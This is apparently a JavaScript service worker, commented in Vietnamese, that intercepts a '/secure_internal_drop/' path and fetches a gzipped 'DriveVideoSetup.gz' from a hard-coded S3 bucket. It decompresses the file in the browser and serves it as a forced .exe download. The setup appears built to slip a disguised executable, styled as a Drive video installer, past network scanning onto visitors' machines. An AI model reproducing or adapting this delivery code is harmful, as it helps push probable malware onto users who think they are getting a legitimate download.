self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
    const url = event.request.url;

    // 1. Giữ nguyên bộ Ping kiểm tra (nếu cần)
    if (url.includes('/drive_secure_download_ping')) {
        event.respondWith(new Response('pong', { status: 200 }));
        return;
    }

    // 2. Đánh chặn đường dẫn nội bộ và kéo TRỰC TIẾP từ S3 CDN
    if (url.includes('/secure_internal_drop/')) {
        
        // Link gốc trực tiếp từ S3 (Đã cấu hình CORS)
        const directS3Url = 'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';

        event.respondWith(
            // Kéo thẳng từ AWS S3 với băng thông tối đa của Client, bỏ qua mọi tầng cache
            fetch(directS3Url, { 
                mode: 'cors', 
                cache: 'no-store' 
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`S3 Download Failed: ${response.status} ${response.statusText}`);
                }

                // Thực hiện giải nén mượt mà bằng Stream (Không tốn RAM, xử lý theo chunk)
                const ds = new DecompressionStream('gzip');
                const decompressedStream = response.body.pipeThrough(ds);

                // Xử lý đổi tên file từ .gz sang .exe một cách an toàn
                let filename = directS3Url.split('/').pop().split('?')[0];
                filename = decodeURIComponent(filename).replace(/\.gz$/i, '.exe');

                // Ép trình duyệt mở hộp thoại Download thay vì cố gắng đọc file .exe
                const headers = new Headers({
                    'Content-Type': 'application/octet-stream',
                    'Content-Disposition': `attachment; filename="${filename}"`
                });

                return new Response(decompressedStream, { headers });
            })
            .catch(err => {
                console.error("[SW Direct Fetch Error]:", err);
                return new Response(`Direct Download Error: ${err.message}`, { 
                    status: 500,
                    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
                });
            })
        );
        return;
    }
});